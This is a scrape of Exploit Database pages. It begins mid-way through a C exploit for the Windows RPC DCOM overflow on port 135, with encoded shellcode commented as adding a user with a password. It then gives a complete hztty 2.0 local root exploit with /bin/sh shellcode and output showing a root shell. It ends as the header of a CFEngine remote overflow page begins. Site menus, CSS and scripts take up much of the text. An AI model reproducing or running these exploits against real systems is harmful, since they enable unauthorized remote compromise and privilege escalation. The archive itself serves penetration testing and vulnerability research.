30,0x00,0x2E,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x68,0x00,0x00,0x00,0x0E,0x00,0xFF,0xFF,0x68,0x8B,0x0B,0x00,0x02,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};unsigned char request2[]={0x20,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x00,0x00,0x00,0x5C,0x00,0x5C,0x00};unsigned char request3[]={0x46,0x00,0x43,0x00,0x24,0x00,0x46,0x00,0x31,0x00,0x32,0x00,0x33,0x00,0x34,0x00,0x35,0x00,0x36,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x31,0x00,0x2E,0x00,0x64,0x00,0x6F,0x00,0x63,0x00,0x00,0x00};unsigned char sccnsp3sp4[]="\x6C\x00\x6F\x00\x63\x00\x61\x00\x6C\x00\x68\x00""\x6F\x00\x73\x00\x74\x00\x5C\x00\x43\x00\x24\x00\x5C\x00""\x58\x00\xeb\x3c\x46\x00\x46\x00\xeb\x7c\x46\x00\x46\x00\x38\x6e""\xeb\x02\xeb\x05\xe8\xf9\xff\xff\xff\x58\x83\xc0\x1b\x8d\xa0\x01""\xeb\x1e\xff\x83\xe4\xfc\x8b\xec\x33\xc9\x66\xb9\x99\x01\x80\x30""\xf6\xe0\xe0\x93\xdf\xfc\xf2\xf7\xeb\x06\xf1\xe1\xf2\xe1\xea\xd2"//SHELLCODE From  SAM ,THANKs !//Add user SST,password is 557,"\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x4D\x01\x80\x34\x0A\x99\xE2\xFA""\xEB\x05\xE8\xEB\xFF\xFF\xFF""\x70\xDA\x98\x99\x99\xCC\x12\x75\x18\x75\x19\x99\x99\x99\x12\x6D""\x71\x92\x98\x99\x99\x10\x9F\x66\xAF\xF1\x01\x67\x13\x97\x71\x3C""\x99\x99\x99\x10\xDF\x95\x66\xAF\xF1\xE7\x41\x7B\xEA\x71\x0F\x99""\x99\x99\x10\xDF\x89\xFD\x38\x81\x99\x99\x99\x12\xD9\xA9\x14\xD9""\x81\x22\x99\x99\x8E\x99\x10\x81\xAA\x59\xC9\xF3\xFD\xF1\xB9\xB6""\xF8\xFD\xF1\xB9\xEA\xEA\xED\xF1\xEC\xEA\xFC\xEB\xF1\xF7\xFC\xED""\xB9\x12\x55\xC9\xC8\x66\xCF\x95\xAA\x59\xC9\xF1\xB9\xAC\xAC\xAE""\xF1\xB9\xEA\xEA\xED\xF1\xEC\xEA\xFC\xEB\xF1\xF7\xFC\xED\xB9\x12""\x55\xC9\xC8\x66\xCF\x95\xAA\x59\xC9\xF1\xFD\xFD\x99\x99\xF1\xED""\xB9\xB6\xF8\xF1\xEA\xB9\xEA\xEA\xF1\xF8\xED\xF6\xEB\xF1\xF0\xEA""\xED\xEB\xF1\xFD\xF4\xF0\xF7\xF1\xEC\xE9\xB9\xF8\xF1\xF5\xFE\xEB""\xF6\xF1\xF5\xF6\xFA\xF8\xF1\xF7\xFC\xED\xB9\x12\x55\xC9\xC8\x66""\xCF\x95\xAA\x59\xC9\x66\xCF\x89\xCA\xCC\xCF\xCE\x12\xF5\xBD\x81""\x12\xDC\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81\x12\xC3\xB9\x9A""\x44\x7A\xAB\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65\xAA\x59\x35\xA3""\x5D\xED\x9E\x58\x56\x94\x9A\x61\x72\x6B\xA2\xE5\xBD\x8D\xEC\x78""\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A\x44\x12\x9D""\x12\x9A\x5C\x72\x9B\xAA\x59\x12\x4C\xC6\xC7\xC4\xC2\x5B\x9D\x99""\xCC\xCF\xFD\x38\xA9\x99\x99\x99\x1C\x59\xE1\x95\x12\xD9\x95\x12""\xE9\x85\x34\x12\xF1\x91\x72\x90\x12\xD9\xAD\x12\x31\x21\x99\x99""\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71\x21\x67\x66\x66""\x6e\x60\x38\xcc\x54\xd6\x93\xd7\x93\x93\x93\x1a\xce\xaf\x1a\xce""\xab\x1a\xce\xd3\x54\xd6\xbf\x92\x92\x93\x93\x1e\xd6\xd7\xc3\xc6""\xc2\xc2\xc2\xd2\xc2\xda\xc2\xc2\xc5\xc2\x6c\xc4\x77\x6c\xe6\xd7""\x6c\xc4\x7b\x6c\xe6\xdb\x6c\xc4\x7b\xc0\x6c\xc4\x6b\xc3\x6c\xc4""\x7f\x19\x95\xd5\x17\x53\xe6\x6a""\xc2\xc1\xc5\xc0\x6c\x41\xc9\xca""\x1a\x94\xd4\xd4\xd4\xd4\x71\x7a\x50\x90\x90\x90"     //"\x90\x90\x90\x90\x90\x90\x90\x90""\x77\xe0\x43\x00\x00\x10\x5c\x00""\xeb\x1e\x01\x00"//     FOR CN SP3/SP4+-MS03-26"\x4C\x14\xec\x77"//    TOP SEH FOR cn w2k+SP4,must modify to SEH of your target's os//FILL BYTE,so sizeof(UNC)>0X400(0X80*8),why? You can read more form  my artic//"Utilization of released heap structure and exploit of universal Heap overflow in windows "."\xEB\x10\x5A\x4A\x33\xC9\x66\xB9\x90\x02\x80\x34\x0A\x99\xE2\xFA""\xEB\x05\xE8\xEB\xFF\xFF\xFF""\xC7\x5F\x9D\xBD\xDD\x14\xDD\xBD\xDD\xC9\x14\xDD\xBD\x9D\xC9\x14""\x1D\xBD\x1D\x99\x99\x99\xC9\x14\x1D\xBD\x0D\x99\x99\x99\xC9\xAA""\x59\xC9\xC9\xC9\xC9\xCA\x14\x1D\xBD\x2D\x99\x99\x99\xC9\x66\xCF""\x95\x14\xD5\xBD\xDD\x14\x8D\xBD\xAA\x59\xC9\xF1\xAC\x99\xAE\x99""\xF1\xB9\x99\xAC\x99\xF1\xEA\x99\xED\x99\xF1\xB9\x99\xEA\x99\xF1""\xFC\x99\xEB\x99\xF1\xEC\x99\xEA\x99\xF1\xED\x99\xB9\x99\xF1\xF7""\x99\xFC\x99\x12\x45\xC8\xCB\xC8\xCB\x14\x1D\xBD\x29\x99\x99\x99""\xC9\x14\x1D\xBD\x59\x99\x99\x99\xC9\xAA\x59\xC9\xC9\xC9\xC9\xCA""\x14\x1D\xBD\x79\x99\x99\x99\xC9\x66\xCF\x95\xC3\xC0\xAA\x59\xC9""\xF1\xFD\x99\xFD\x99\xF1\xB6\x99\xF8\x99\xF1\xED\x99\xB9\x99\xF1""\xEA\x99\xEA\x99\xF1\xEA\x99\xB9\x99\xF1\xF6\x99\xEB\x99\xF1\xF8""\x99\xED\x99\xF1\xED\x99\xEB\x99\xF1\xF0\x99\xEA\x99\xF1\xF0\x99""\xF7\x99\xF1\xFD\x99\xF4\x99\xF1\xB9\x99\xF8\x99\xF1\xEC\x99\xE9""\x99\xF1\xEB\x99\xF6\x99\xF1\xF5\x99\xFE\x99\xF1\xFA\x99\xF8\x99""\xF1\xF5\x99\xF6\x99\xF1\xED\x99\xB9\x99\xF1\xF7\x99\xFC\x99\x12""\x45\xC8\xCB\x14\x1D\xBD\x61\x99\x99\x99\xC9\x14\x1D\xBD\x91\x98""\x99\x99\xC9\xAA\x59\xC9\xC9\xC9\xC9\xCA\x14\x1D\xBD\xB1\x98\x99""\x99\xC9\x66\xCF\x95\xAA\x59\xC9\x66\xCF\x89\xCA\xCC\xCF\xCE\x12""\xF5\xBD\x81\x12\xDC\xA5\x12\xCD\x9C\xE1\x9A\x4C\x12\xD3\x81\x12""\xC3\xB9\x9A\x44\x7A\xAB\xD0\x12\xAD\x12\x9A\x6C\xAA\x66\x65\xAA""\x59\x35\xA3\x5D\xED\x9E\x58\x56\x94\x9A\x61\x72\x6B\xA2\xE5\xBD""\x8D\xEC\x78\x12\xC3\xBD\x9A\x44\xFF\x12\x95\xD2\x12\xC3\x85\x9A""\x44\x12\x9D\x12\x9A\x5C\x72\x9B\xAA\x59\x12\x4C\xC6\xC7\xC4\xC2""\x5B\x9D\x99\xCC\xCF\xFD\x38\xA9\x99\x99\x99\x1C\x59\xE1\x95\x12""\xD9\x95\x12\xE9\x85\x34\x12\xF1\x91\x72\x90\x12\xD9\xAD\x12\x31""\x21\x99\x99\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71\xEC\x64\x66\x66""\x04\x04\x00\x70\x00\x04\x40""\x00\x10\x5c\x00\x78\x01\x07\x00\x78\x01\x07\x00\xa0\x04\x00""\x21\x99\x99\x99\x12\x5C\xC7\xC4\x5B\x9D\x99\x71";unsigned char request4[]={0x01,0x10,0x08,0x00,0xCC,0xCC,0xCC,0xCC,0x20,0x00,0x00,0x00,0x30,0x00,0x2D,0x00,0x00,0x00,0x00,0x00,0x88,0x2A,0x0C,0x00,0x02,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x28,0x8C,0x0C,0x00,0x01,0x00,0x00,0x00,0x07,0x00,0x00,0x00,0x00,0x00,0x00,0x00};void main(int argc,char ** argv){WSADATA WSAData;SOCKET sock;int len,len1;SOCKADDR_IN addr_in;short port=135;unsigned char buf1[0x1000];unsigned char buf2[0x1000];printf("RPC DCOM overflow Vulnerability discoveried by NSFOCUS\n");printf("Code by FlashSky,Flashsky xfocus org\n");printf("Welcome to our Site: http://www.xfocus.org\n");printf("Welcome to our Site: http://www.venustech.com.cn\n");if(argc!=2){printf("%s targetIP \n",argv[0]);printf("for cn w2k server sp3/sp4+ms03-26\n");}if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0){printf("WSAStartup error.Error:%d\n",WSAGetLastError());return;}addr_in.sin_family=AF_INET;addr_in.sin_port=htons(port);addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET){printf("Socket failed.Error:%d\n",WSAGetLastError());return;}len1=sizeof(request1);len=sizeof(sccnsp3sp4);if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR){printf("Connect failed.Error:%d",WSAGetLastError());return;}memcpy(buf2,request1,sizeof(request1));*(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(sccnsp3sp4)/2;*(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(sccnsp3sp4)/2;memcpy(buf2+len1,request2,sizeof(request2));len1=len1+sizeof(request2);memcpy(buf2+len1,sccnsp3sp4,sizeof(sccnsp3sp4));len1=len1+sizeof(sccnsp3sp4);memcpy(buf2+len1,request3,sizeof(request3));len1=len1+sizeof(request3);memcpy(buf2+len1,request4,sizeof(request4));len1=len1+sizeof(request4);*(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+len-0xc;*(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+len-0xc;*(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+len-0xc;*(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+len-0xc;*(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+len-0xc;*(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+len-0xc;*(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+len-0xc;*(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+len-0xc;if (send(sock,bindstr,sizeof(bindstr),0)==SOCKET_ERROR){printf("Send failed.Error:%d\n",WSAGetLastError());return;}len=recv(sock,buf1,1000,NULL);if (send(sock,buf2,len1,0)==SOCKET_ERROR){printf("Send failed.Error:%d\n",WSAGetLastError());return;}//    len=recv(sock,buf1,1024,NULL);}/**/// milw0rm.com [2003-09-20]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 104
hztty 2.0 (RedHat 9.0) - Local Privilege Escalation - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDhztty 2.0 (RedHat 9.0) - Local Privilege EscalationEDB-ID:104CVE:2003-0783EDB Verified:Author:c0wboyType:localExploit:/Platform:LinuxDate:2003-09-21Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*  0x333hztty => hztty 2.0 local root exploit***	more info : Debian Security Advisory DSA 385-1**	*note* I adjusted some part of hztty's code since*	there were some errors. hope this will not influence*	exploitation :> tested against Red Hat 9.0 :** [c0wboy@0x333 c0wboy]$ gcc 0x333hztty.c -o k* [c0wboy@0x333 c0wboy]$ ./k**  ---  local root exploit for hztty 2.0  ---*  ---  coded by c0wboy ~ 0x33  ---** sh-2.05b# [./hztty started]  [using /dev/ttyp6]* sh-2.05b$ sh-2.05b# uid=0(root) gid=0(root) groups=500(c0wboy)* sh-2.05b#**  coded by c0wboy**  (c) 0x333 Outsiders Security Labs**/#include <stdio.h>#include <unistd.h>#define BIN    "./hztty"#define SIZE   272unsigned char shellcode[] ="\x31\xdb\x89\xd8\xb0\x17\xcd\x80\x31\xdb\x89\xd8""\xb0\x2e\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68""\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31""\xd2\xb0\x0b\xcd\x80" ;int main(){int i;char out[SIZE];char *own[] = { shellcode, 0x0 };int *hztty = (int *)(out);int ret = 0xbffffffa - strlen(BIN) - strlen(shellcode);for (i=0 ; i<SIZE-1 ; i+=4)*hztty++ = ret;hztty = 0x0;fprintf (stdout, "\n ---  local root exploit for hztty 2.0  ---\n");fprintf (stdout, " ---  coded by c0wboy ~ www.0x333.org   ---\n\n");execle (BIN, BIN, "-I", out, 0x0, own, 0x0);}// milw0rm.com [2003-09-21]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 105
GNU CFEngine 2.-2.0.3 - Remote Stack Overflow - BSD remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover 